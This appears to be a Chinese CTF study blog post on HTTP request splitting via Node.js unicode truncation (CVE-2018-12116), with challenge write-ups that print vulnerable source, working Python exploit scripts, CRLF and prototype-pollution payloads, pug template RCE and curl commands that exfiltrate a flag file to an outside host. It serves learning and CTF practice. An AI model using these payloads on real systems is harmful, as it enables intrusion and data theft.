---
title: "HTTP请求切分攻击学习笔记"
slug: "http-request-splitting-attack-study-notes"
description: "用心整理学习了属于是，算是有了比较深刻的认识（并不"
date: 2021-12-07T02:24:15+08:00
categories: ["NOTES&SUMMARY"]
series: []
tags: ["SSRF", "Node.js"]
draft: false
toc: true
---

说到与HTTP请求有关的攻击方式能想到什么？

![image-20211205111212810](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205111212810.png)

~~是不是一下子恍然大明白了~~

这一篇就是其中HTTP Request Splitting的学习笔记，长期更新；其它模块的也会随后更新~

老规矩，所有的参考链接&docker链接放到文末

## Node.js: http请求路径中的unicode字符损坏

> 使用Node.js向特定路径发出http请求，但是却被定向到了不一样的路径

虽然用户发出的http请求通常是个字符串string，但Node.js最终必须将请求以原始字节raw bytes输出，js支持unicode，这其中涉及到了unicode编码转换。对于不包含body的请求，Node.js默认使用`latin1`，它是单字节编码，不能表示高编号的unicode字符，比如emoji 🐶

```js
v = '/caf\u{E9}\u{01F436}'
console.log(v)

w = Buffer.from(v, 'latin1').toString('latin1')
console.log(w)
```

![image-20211205103409976](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205103409976.png)

两字节的unicode编码用`latin1`转换为单字节时会被截去开头的第一个字节

```js
console.log(Buffer.from('\u{5b}', 'latin1').toString())
console.log(Buffer.from('\u{015b}', 'latin1').toString())

console.log(Buffer.from('\u{0128}', 'latin1').toString())
console.log(Buffer.from('\u{28}', 'latin1').toString())
```

![image-20211205103625305](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205103625305.png)

------

那这个Node.js的安全问题跟SSRF又是怎么联系到一起的呢？处理用户输入时出现了数据损坏是个明显的危险信号

## HTTP Request Splitting

> *This entails the adversary injecting malicious user input into various standard and/or user defined HTTP headers within a HTTP Request through user input of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters and unique character encoding. This malicious user input allows for web script to be injected in HTTP headers as well as into browser cookies or Ajax web/browser object parameters like XMLHttpRequest during implementation of asynchronous requests.*

通俗来说，就是原本1个请求对应1次响应，现在我们对请求的body部分再添加1个请求，导致看似发送了1次请求实则会被解释为2个响应被加载出来，会造成XSS和SSRF

举一个简单的小栗子：一般的请求形式是这样的

```http
GET /private-api?q=<user-input-here> HTTP/1.1
```

但是我们构造了这样的用户输入

```
x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n
```

当请求发出后，服务端将会收到这样的请求

```http
GET /private-api?q=x HTTP/1.1

DELETE /private-api HTTP/1.1

```

包含了两个请求方式，如果服务端没有设置特殊的过滤则可能会将两个请求全部执行并回显；而如果第二个额外的请求包含一些只有服务端本地才能访问到的内容，则会造成SSRF(Server-Side Request Forgery)

## SSRF via Request Splitting / cve-2018-12116

正如上面栗子展示的那样，不过一般http库都会对这种行为做出防范；Node.js也不例外，比如

```js
const http = require('http');
http.get('http://gqa6995cu69dkt0oxvzzzwzt0k6auz.burpcollaborator.net/\r\n/test')
```

![image-20211205160107403](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205160107403.png)

换成unicode呢？画风开始奇怪了

```
'http://example.com/\u{010D}\u{010A}/test'
```

![image-20211205160205490](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205160205490.png)

上面我们提过的unicode截去开头第一个字节的事情，我们就可以构造`\r\n`了

```js
Buffer.from('http://example.com/\u{010D}\u{010A}/test', 'latin1').toString()
```

![image-20211205164009244](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205164009244.png)

当Node.js<=8构造对这样的url请求时，由于他们不是HTTP控制字符所以不会修改，原样输出；而结合上面我们提过的unicode截去开头第一个字节的事情，我们就可以构造`\r\n`的CRLFi了

现在的Node.js均已修复此问题，官方修复->[http: add --security-revert for CVE-2018-12116](https://github.com/nodejs/node/commit/dd20c0186f)

![image-20211205163601837](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205163601837.png)

旧版中会直接对解释不了的unicode报错，而不是尝试原封不动的搬过去请求

![image-20211205163703908](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205163703908.png)

### 真实场景下的案例

来自->[Security Bugs in Practice: SSRF via Request Splitting](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/) 强烈建议看原文

火狐邮箱账号的客户端与服务器后端交互流程是这样的

```
 +--------+        +--------+        +-----------+       +----------+
 | Client |  HTTP  |  API   |  HTTP  | DataStore |  SQL  |   MySQL  |
 |        |<------>| Server |<------>|  Service  |<----->| Database |
 +--------+        +--------+        +-----------+       +----------+
```

客户端发出的请求是通过http与API Server交互的，比如一个这样的请求

```http
GET /email/74657374406578616d706c652e636f6d
```

会得到`test@example.com`的邮件记录，用hex做了请求的路由，但是一个删除操作却是直接拼接字符串

```http
DELETE /account/xyz/emails/test@example.com
```

此时，最后的端点可控，结合上面的bug，当我们注册这样一个账号

```
x@̠ňƆƆɐį1̮1č̊č̊ɆͅƆ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňƆƆɐį1̮1č̊č̊.cc
```

它其实是这样

```
v = 'x@̠ňƆƆɐį1̮1č̊č̊ɆͅƆ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňƆƆɐį1̮1č̊č̊.cc'
Buffer.from(v.toLowerCase(), "latin1").toString()
```

![image-20211205205928287](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205205928287.png)

~~真是Node.js的美妙特性~~

对这样一个账号再次进行DELETE请求时则会这样

```
console.log(Buffer.from('DELETE /account/f9f9eebb05ef4b819b0467cc5ddd3b4a/email/x@̠ňɔɔɐį1̮1č̊č̊ɇͅɔ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňɔɔɐį1̮1č̊č̊.cc', 'latin1').toString())
```

![image-20211205210133004](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205210133004.png)

SSRF来了

## [ASISCTF final 2018]Proxy-Proxy

简单审了一下代码，标记到注释中了

```js
const express = require('express');
const fs = require('fs');
const path = require('path');
const body_parser = require('body-parser');
const md5 = require('md5');
const http = require('http');
var ip = require("ip");
require('x-date');
var server_ip = ip.address()
const server = express();
server.use(body_parser.urlencoded({
    extended: true
}));
server.use(express.static('public'))
server.set('views', path.join(__dirname, 'views'));
server.set('view engine', 'jade');
server.listen(5000)
server.get('/', function(request, result) {
    result.render('index');
    result.end()
})
function check_endpoint(available_endpoints, endpoint) {
    for (i of available_endpoints) {
        if (endpoint.indexOf(i) == 0) {
            return true;
        }
    }
    return false;
}
fs.readFile('flag.dat', 'utf8', function(err, contents) {
    if (err) {
        throw err;
    }
    flag = contents;
})
server.get('/proxy/internal_website/:page', function(request, result) {
    var available_endpoints = ['public_notes', 'public_links', 'source_code']
    var page = request.params.page
    result.setHeader('X-Node-js-Version', 'v8.12.0')	// 版本提示
    result.setHeader('X-Express-Version', 'v4.16.3')
    if (page.toLowerCase().includes('flag')) {  // 先转小写再判断 不能有flag
        result.sendStatus(403)
        result.end()
    } else if (!check_endpoint(available_endpoints, page)) {    // 白名单审查
        result.render('available_endpoints', {
            endpoints: JSON.stringify(available_endpoints)
        })
        result.end()
    } else {
        http.get('http://127.0.0.1:5000/' + page, function(res) {
            res.setEncoding('utf8');
            if (res.statusCode == 200) {
                res.on('data', function(chunk) {
                    result.render('proxy', {
                        contents: chunk // 返回结果
                    })
                    result.end()
                });
            } else if (res.statusCode == 404) {
                result.render('proxy', {
                    contents: 'The resource not found.'
                })
                result.end()
            } else {
                result.end()
            }
        }).on('error', function(e) {
            console.log("Got error: " + e.message); // 返回报错原因
        });
    }
})
server.use(function(request, result, next) {    // 检查ip是否为本地
    ip = request.connection.remoteAddress
    if (ip.substr(0, 7) == "::ffff:") {
        ip = ip.substr(7)
    }
    if (ip != '127.0.0.1' && ip != server_ip) {
        result.render('unauthorized')
        result.end()
    } else {
        next()
    }
})
server.get('/public_notes', function(request, result) {
    result.render('public_notes');
    result.end()
})
server.get('/public_links', function(request, result) {
    result.render('public_links');
    result.end()
})
server.get('/source_code', function(request, result) {
    fs.readFile('server.js', 'utf8', function(err, contents) {
        if (err) {
            throw err;
        }
        result.render('source_code', {
            source: contents    // 返回源码
        })
        result.end()
    })
})
server.get('/flag/:token', function(request, result) {
    var token = request.params.token
    if (token.length > 10) {
        console.log(ip) // 长度大于10回显ip
        fs.writeFile('public/temp/' + md5(ip + token), flag, (err) => { // 将flag写入public/temp/md5(ip+token)路径下 路径可控 但是访问本身受限 需要SSRF绕过
            if (err) throw err;
            result.end();
        });
    }
})
server.get('/', function(request, result) {
    result.render('index');
    result.end()
})
server.get('*', function(req, result) {
    result.sendStatus(404);
    result.end()
});
```

突破口在它使用的Node.js的版本恰好有上述SSRF的问题

```js
result.setHeader('X-Node-js-Version', 'v8.12.0')
result.setHeader('X-Express-Version', 'v4.16.3')
```

入手点的代码代码就是这里了

![image-20211205210752342](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205210752342.png)

现在就说想办法绕过白名单的审查并构造payload；我们需要第一个请求指向`/proxy/internal_website/public_notes`，第二个请求指向`/flag/amiz`，让flag存在`public/temp/md5(127.0.0.1amiz)`路径下

```
public_notes\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0166}\u{016c}\u{0161}\u{0167}/amiz
```

```
/proxy/internal_website/public_notes%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2F%C5%A6%C5%AC%C5%A1%C5%A7%2Famiz
```

## [安洵杯 2019]Membershop

![image-20211206224942653](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206224942653.png)

admin会被过滤，那就先简单登入

![image-20211206225301864](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206225301864.png)

抓包后通过session可以看出是koa框架

这里出题人说很容易联想到后端使用`toUpperCase()`的转换，用拉丁文越权登录`admın`，之前也有一次做题用到这个点了，但是在这里没有想起来，我的

![image-20211206225648044](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206225648044.png)

这下可以看源码了

```js
const Koa = require('koa')
const router = require('koa-router')
const session = require('koa-session')
const bodyParser = require('koa-bodyparser')
const isString = require('underscore').isString
const views = require('koa-views')
const path = require('path')
const static = require('koa-static')
const http = require('http')
const fs = require('fs')
const md5 = require('md5');
const qs = require('qs');

const app = new Koa()
const home  = new router()
const CONFIG = {
    key: 'koa:sess',
    maxAge: 1800000,
    overwrite: true,
    httpOnly: true,
    signed: true,
    rolling: false,
    renew: false,
  };


function checkUser(username){
    while(username.match(/admin/i)) {
      username = username.replace(/admin/i, '');
    }

    if(isString(username) && username){
        return username;
    }else{
        return undefined;
    }
}

function checkUrl(url){
    if(url.indexOf("http://"+server_ip+":3000/query") === 0 && url.indexOf('save') === -1){
        return url;
    }else{
        return 'errorurl';
    }
}


function WriteResults(sandbox,data){
    let filePath = sandbox +'/results.txt'

    return new Promise(resolve =>{
            fs.appendFile(filePath,data,'utf8',function(error){
                if(error){
                    console.log(error);
                    return false;
                }
                console.log('写入成功');
                resolve(filePath);
            });
    });
}


function DeleteResults(sandbox){
    let filePath = sandbox+'/results.txt'

    fs.unlink(filePath),function(error){
        if(error){
            console.log(err);
            return false;
        }
        console.log('删除文件成功');
    }


}


home.get('/query',async(ctx)=>{
    if(ctx.query.param){
        ctx.response.body = String(ctx.query.param).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    }else{
        ctx.status = 403;
        ctx.response.body = 'missing parameter:param';
    }
})


home.get('/request',async(ctx)=>{
    if(ctx.session.username === 'ADMIN' && ctx.query.url){
        url = decodeURI(checkUrl(ctx.query.url))
        if(url === 'errorurl'){
            ctx.response.body = 'error url';
        }else{
            console.log("请求的url:"+typeof(url)+":"+url);
            return new Promise( resolve => {
                const req = http.request(url, res => {
                    res.setEncoding('utf-8');
                    let data = '';
                    let error;

                    if (res.statusCode !== 200){
                        error = new Error('请求失败\n' +
                        `状态码: ${res.statusCode}`)
                    };

                    if (error) {
                        console.error(error.message);
                        res.resume();
                        return;
                    }
                    res.on('data', chunk => {
                        data += chunk.toString();
                    });
                    res.on('end', async() => {
                        let out = await WriteResults(ctx.session.sandbox,data);
                        ctx.body = 'Requst results in :'+out.replace('tmp','');
                        resolve();
                    })
                })

                req.on('error', function(err){
                    console.log(err);
                  });

                req.end();
            });
        }
    }else{
        ctx.status = 403;
        ctx.response.body = '403: You have not the permission'
    }
})

home.get('/save',async(ctx)=>{
    let ip = ctx.request.ip;

    if (ip.substr(0, 7) == "::ffff:") {
        ip = ip.substr(7);
    }
    if (ip !== '127.0.0.1' && ip !== server_ip) {
        ctx.status = 403;
        ctx.response.body = '403: You are not the local user';
    }else {
        let reqbody = {switch:false}
        reqbody = qs.parse(ctx.querystring,{allowPrototypes: false});

        if(reqbody.switch === true && reqbody.sandbox && reqbody.opath &&fs.existsSync(reqbody.spath)){
            if(fs.existsSync(reqbody.sandbox)){
                paths.opath = fs.readdirSync(reqbody.sandbox)[0];
            }else if(fs.existsSync(reqbody.opath)){
                let buffer;
                tmp[reqbody.sandbox]['opath'] = reqbody.opath;
                if(/[flag]/.test(tmp[reqbody.sandbox]['opath'])){
                    buffer = tmp[reqbody.sandbox]['opath'].replace(/f|l|a|g/g,'');
                }else{
                    buffer = reqbody.opath;
                }
            }
            let opath = paths.opath? paths.opath : buffer;
            let text = fs.readFileSync(opath, 'utf8');
            await WriteResults(reqbody.spath,text);

        }else{
            return false;
        }
    }
})

home.get('/delete',async(ctx)=>{
    if(ctx.session.username === 'ADMIN' && fs.existsSync(ctx.session.sandbox+'/results.txt')){
        DeleteResults(ctx.session.sandbox);
        ctx.response.body = 'Delete the results Successfully!'
    }else{
        ctx.response.body = 'Nothing to delete!';
    }
})

home.get('/login',async(ctx)=>{
    if(ctx.query.userName){
        let username = checkUser(ctx.query.userName);
        if (username !== undefined){
            ctx.session.username = username.toUpperCase();
        }
    }
    ctx.redirect('/');
})

home.get('/',async(ctx)=>{
    let isAdmin = undefined;
    if(!ctx.session.username){
        await ctx.render('user',{
            list:undefined,
            isAdmin:isAdmin
        });
    }else{
        info.username = ctx.session.username;
        info.Privilege = "Staff";
        if(ctx.session.username === 'ADMIN'){
            info.Privilege = "Monitor";
            isAdmin = true;

            if(!ctx.session.sandbox){
                ctx.session.sandbox = 'tmp/'+md5(ctx.request.ip);
            }

            if (!fs.existsSync(ctx.session.sandbox)){
                fs.mkdirSync(ctx.session.sandbox);
            }
        }
        await ctx.render('user',{
            list:info,
            isAdmin:isAdmin
        });
    }
})

app.keys = ['hpdoger'];
var info = new Object();
var tmp = [];
var paths = [];

//depend on remote server,not real
var server_ip = '127.0.0.1'

app.use(views(path.join(__dirname, './views'), {
    extension: 'ejs'
}))

app.use(static(
    path.join( __dirname,  './static')
  ))
app.use(static(
    path.join( __dirname,  './tmp')
))

app.use(bodyParser())
app.use(session(CONFIG, app));
app.use(home.routes()).use(home.allowedMethods());


app.listen(3000)
console.log('[demo] start-quick is starting at port 3000')
```

唔，看起来要比其它的复杂不少，但是核心漏洞点是一样的；简单审一下代码

![image-20211206230457270](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206230457270.png)

只允许admin用户才可以加载其它的模板

![image-20211206230620584](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206230620584.png)

确实是`toUpperCase()`的问题，很轻松就用`admın`绕过了

![image-20211206231746702](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206231746702.png)

/request路由下的请求经过`CheckUrl`的检查

![image-20211206231939254](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206231939254.png)

必须开头是http://127.0.0.1:3000/query，没法绕过，需要SSRF；请求之后会被记录在sandbox的results.txt里面（追加的形式），sandbox根据ip建立

而恰好/query本身也是一个路由

![image-20211206232301967](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206232301967.png)

并且参数param比较好绕过，我们借助它来完成我们的攻击；接下来找利用点，看到/save路由

![image-20211206234720831](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206234720831.png)

简单的分析写在注释中了，138行用ssrf绕过，146行使用的qs库有[原型链污染](https://security.snyk.io/vuln/npm:qs:20170213)的问题，传参`]=switch`即可绕过；154行的判断也需要绕过，原型链污染sandbox下的一个文件为`/flag`，再去自定义读到spath中

```
tmp['__proto__']['opath'] = '/flag';
=>
paths.opath = /flag
```

payload

```http
amiz HTTP/1.1
Host: 127.0.0.1:3000
Connection: keep-alive

GET /save?]=switch&sandbox=__proto__&opath=/flag&spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76
```

```
http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&sandbox=__proto__&opath=/flag&spath=tmp/c74e4def8b621891bc34c84bca9b2a76
```

![image-20211207020732089](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207020732089.png)

![image-20211207001654270](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207001654270.png)

![image-20211207002041861](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207002041861.png)

当然，用完全unicode编码也是可以的，亲测这个全编码容错率会高一丢丢

```python
from requests.utils import quote
_payload = '''amiz HTTP/1.1
Host: 127.0.0.1:3000
Connection: keep-alive

GET /save?]=switch&sandbox=__proto__&opath=/flag&spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76'''

payload = _payload.replace("\n", "\r\n")
payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
print(quote(payload))

```

## [nullcon HackIM2020]Split second

```js
//node 8.12.0
var express = require('express');
var app = express();
var fs = require('fs');
var path = require('path');
var http = require('http');
var pug = require('pug');

app.get('/', function(req, res) {
    res.sendFile(path.join(__dirname + '/index.html'));
});

app.get('/source', function(req, res) {
    res.sendFile(path.join(__dirname + '/source.html'));
});


app.get('/getMeme',function(req,res){
   res.send('<iframe src="https://giphy.com/embed/LLHkw7UnvY3Kw" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/kid-dances-jumbotron-LLHkw7UnvY3Kw">via GIPHY</a></p>')

});


app.get('/flag', function(req, res) {
    var ip = req.connection.remoteAddress;
    if (ip.includes('127.0.0.1')) {
        var authheader = req.headers['adminauth'];
        var pug2 = decodeURI(req.headers['pug']);
        var x=pug2.match(/[a-z]/g);
        if(!x){
         if (authheader === "secretpassword") {
            var html = pug.render(pug2);
         }
        }
       else{
        res.send("No characters");
      }
    }
    else{
     res.send("You need to come from localhost");
    }
});

app.get('/core', function(req, res) {
    var q = req.query.q;
    var resp = "";
    if (q) {
        var url = 'http://localhost:8081/getMeme?' + q
        console.log(url)
        var trigger = blacklist(url);
        if (trigger === true) {
            res.send("<p>Errrrr, You have been Blocked</p>");
        } else {
            try {
                http.get(url, function(resp) {
                    resp.setEncoding('utf8');
                    resp.on('error', function(err) {
                    if (err.code === "ECONNRESET") {
                     console.log("Timeout occurs");
                     return;
                    }
                   });

                    resp.on('data', function(chunk) {
                        resps = chunk.toString();
                        res.send(resps);
                    }).on('error', (e) => {
                         res.send(e.message);});
                });
            } catch (error) {
                console.log(error);
            }
        }
    } else {
        res.send("search param 'q' missing!");
    }
})

function blacklist(url) {
    var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];
    var arrayLen = evilwords.length;
    for (var i = 0; i < arrayLen; i++) {
        const trigger = url.includes(evilwords[i]);
        if (trigger === true) {
            return true
        }
    }
}

var server = app.listen(8081, function() {
    var host = server.address().address
    var port = server.address().port
    console.log("Example app listening at http://%s:%s", host, port)
})
```

如果上一个题仔细分析的话就会发现这个题只是代码做了一些微小的改动

![image-20211205214720894](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205214720894.png)

需要多构造一个请求头，换行的CRLF和空格SP我们用unicode，而pug执行命令的部分我们可以用八进制字符

```js
[]["constructor"]	// valid
[]["constructor"]["constructor"]("evalcode")()
[]["\143\157\156\163\164\162\165\143\164\157\162"]	// valid,executable
[][\42\143\157\156\163\164\162\165\143\164\157\162\42]	// invalid,since " is encoded
```

pug模板两种形式

```js
#{shellcode}
- shellcode
```

写一个外带flag的payload

```js
-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl 172.19.0.1:8888 -X POST -d @flag.txt'))")()
```

我根据这位大佬的py2版[exp.py](https://ctftime.org/writeup/18293)写了一个py3版本的，并且改的简洁了一些（有了一些通用性，但是由于还是部分unicode编码，总体上不如全编码的稳

```python
import requests
from requests.utils import quote

url = ''
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
SPACE = u'\u0120'
CRLF = u'\u010d\u010a'
SLASH = u'\u012f'


# 仅对字母进行编码
def str2Oct(str):
    r = ''
    for i in str:
        if i in charset:
            r += '\\' + oct(ord(i))[1:]
        else:
            r += i
    return r.replace('o', '')


_pug = '''-[]["constructor]["constructor]("console.log(this.process.mainModule.require('child_process').exec('curl http://ip:port/ -d @/flag.txt'))")()'''
pug = str2Oct(_pug).replace('"', '%22').replace("'", "%27")
# print(pug)
# print(quote(pug))

payload = f'''amiz HTTP/1.1

GET /flag HTTP/1.1
x-forwarded-for: 127.0.0.1
adminauth: secretpassword
pug: {pug}
test: '''.replace(' ', f'{SPACE}').replace('/', f'{SLASH}').replace('\n', f'{CRLF}')

print(payload)

r = requests.session()
result = r.get('url' + quote(payload))
print(result.content)

```

本地复现成功

![image-20211206192539624](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206192539624.png)

![image-20211206191832996](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206191832996.png)

## [GYCTF2020]Node Game

```js
var express = require('express');
var app = express();
var fs = require('fs');
var path = require('path');
var http = require('http');
var pug = require('pug');
var morgan = require('morgan');
const multer = require('multer');


app.use(multer({dest: './dist'}).array('file'));
app.use(morgan('short'));   // 简化版日志
app.use("/uploads",express.static(path.join(__dirname, '/uploads')))
app.use("/template",express.static(path.join(__dirname, '/template')))


app.get('/', function(req, res) {
    var action = req.query.action?req.query.action:"index"; // action参数
    if( action.includes("/") || action.includes("\\") ){    // 不能有/ \
        res.send("Errrrr, You have been Blocked");
    }
    file = path.join(__dirname + '/template/'+ action +'.pug');
    var html = pug.renderFile(file);    // 模板渲染
    res.send(html);
});

app.post('/file_upload', function(req, res){
    var ip = req.connection.remoteAddress;
    var obj = {
        msg: '',
    }
    if (!ip.includes('127.0.0.1')) {    // 需要SSRF
        obj.msg="only admin's ip can use it"
        res.send(JSON.stringify(obj));
        return
    }
    fs.readFile(req.files[0].path, function(err, data){
        if(err){
            obj.msg = 'upload failed';
            res.send(JSON.stringify(obj));
        }else{
            var file_path = '/uploads/' + req.files[0].mimetype +"/";   // 路径确定 mimetype可控 路径穿越
            var file_name = req.files[0].originalname
            var dir_file = __dirname + file_path + file_name
            if(!fs.existsSync(__dirname + file_path)){
                try {
                    fs.mkdirSync(__dirname + file_path)
                } catch (error) {
                    obj.msg = "file type error";
                    res.send(JSON.stringify(obj));
                    return
                }
            }
            try {
                fs.writeFileSync(dir_file,data)
                obj = {
                    msg: 'upload success',
                    filename: file_path + file_name
                }
            } catch (error) {
                obj.msg = 'upload failed';
            }
            res.send(JSON.stringify(obj));
        }
    })
})

app.get('/source', function(req, res) { // 源码
    res.sendFile(path.join(__dirname + '/template/source.txt'));
});


app.get('/core', function(req, res) {
    var q = req.query.q;    // q参数
    var resp = "";
    if (q) {
        var url = 'http://localhost:8081/source?' + q   // 可控端点
        console.log(url)
        var trigger = blacklist(url);   // 黑名单过滤
        if (trigger === true) {
            res.send("<p>error occurs!</p>");
        } else {
            try {
                http.get(url, function(resp) {
                    resp.setEncoding('utf8');
                    resp.on('error', function(err) {
                        if (err.code === "ECONNRESET") {
                            console.log("Timeout occurs");
                            return;
                        }
                    });

                    resp.on('data', function(chunk) {
                        try {
                            resps = chunk.toString();
                            res.send(resps);
                        }catch (e) {
                            res.send(e.message);
                        }

                    }).on('error', (e) => {
                        res.send(e.message);});
                });
            } catch (error) {
                console.log(error);
            }
        }
    } else {
        res.send("search param 'q' missing!");
    }
})

function blacklist(url) {	// urlencode绕过 字符串拼接绕过 unicode绕过
    var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];
    var arrayLen = evilwords.length;
    for (var i = 0; i < arrayLen; i++) {
        const trigger = url.includes(evilwords[i]);
        if (trigger === true) {
            return true
        }
    }
}

var server = app.listen(8081, function() {
    var host = server.address().address
    var port = server.address().port
    console.log("Example app listening at http://%s:%s", host, port)
})

```

有上面两个题的铺垫，这个代码就会好理解一些

这个题改编的地方在于多了一个任意文件上传，可以通过`../`的mimetype来进行目录穿越，pug渲染会借助我们上传的.pug模板，在这里包含flag.txt

通过抓包修改内容来做payload

```http
HTTP/1.1
Host: amiz
Connection: keep-alive

POST /file_upload HTTP/1.1
Host: amiz
Content-Length: 266
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
Cache-control: no-cache
Connection: keep-alive

------WebKitFormBoundary4RZFWBFQ4MBn61cf
Content-Disposition: form-data; name="file"; filename="amiz.pug"
Content-Type: /../template

doctype html
html
  head
    style
      include ../../../../../../../flag.txt
------WebKitFormBoundary4RZFWBFQ4MBn61cf--

GET /flag HTTP/1.1
Host: amiz
Connection: close
amiz:
```

使用上面我们已经构造好的通用exp.py构造payload

```python
import requests
from requests.utils import quote

url = 'http://5214b607-8520-4572-9bfc-d289a0e0c4f8.node4.buuoj.cn:81/core?q='
SPACE = u'\u0120'
CRLF = u'\u010d\u010a'
SLASH = u'\u012f'
DOUBLE_MARK = u'\u0122'
SINGLE_MARK = u'\u0127'

_payload = '''HTTP/1.1
Host: amiz
Connection: keep-alive

POST /file_upload HTTP/1.1
Host: amiz
Content-Length: 266
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
Cache-control: no-cache
Connection: keep-alive

------WebKitFormBoundary4RZFWBFQ4MBn61cf
Content-Disposition: form-data; name="file"; filename="amiz.pug"
Content-Type: /../template

doctype html
html
  head
    style
      include ../../../../../../../flag.txt
------WebKitFormBoundary4RZFWBFQ4MBn61cf--

GET /flag HTTP/1.1
Host: amiz
Connection: close
amiz: '''

payload = _payload.replace(' ', f'{SPACE}').replace('\n', f'{CRLF}').replace('/', f'{SLASH}').replace('"', f'{DOUBLE_MARK}').replace("'", f'{SINGLE_MARK}')
print(payload)

result = requests.get(url + quote(payload))
print(result.text)

```

![image-20211206133327186](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133327186.png)

成功得到flag，本地抓包看一下具体情况

![image-20211207011253660](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207011253660.png)

在exp中我们对一些特殊字符做了unicode编码，被编码的字符应该包括以下这些

```
! & ` ; + \ / " ' <SPACE> <CRLF>
```

![image-20211206133438315](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133438315.png)

（！！！注意 这里很可能有遗漏或者不必要的 请根据实际情况修改

下面是完全编码的exp.py

```python
import urllib.parse
import requests

_payload = '''amiz HTTP/1.1
Host: amiz
Connection: keep-alive

POST /file_upload HTTP/1.1
Host: amiz
Content-Length: 266
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
Cache-control: no-cache
Connection: keep-alive

------WebKitFormBoundary4RZFWBFQ4MBn61cf
Content-Disposition: form-data; name="file"; filename="amiz.pug"
Content-Type: ../template

doctype html
html
  head
    style
      include ../../../../../../../flag.txt
------WebKitFormBoundary4RZFWBFQ4MBn61cf--

'''

payload = _payload.replace("\n", "\r\n")
payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
print(payload)
r = requests.get('http://a4d0ae70-d877-43de-8158-ed2b3c8fcb75.node4.buuoj.cn:81/core?q=' + urllib.parse.quote(payload))
print(r.text)

```

将会构造出这种玩意

![image-20211206133631155](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133631155.png)

另外pug模板除了包含flag.txt以外还可以跟上面nullcon的题一样用curl请求来外带flag；稍微修改一下exp即可

放一下[官方exp.py](https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game)

```python
import requests
import sys

payloadRaw = """x HTTP/1.1

POST /file_upload HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
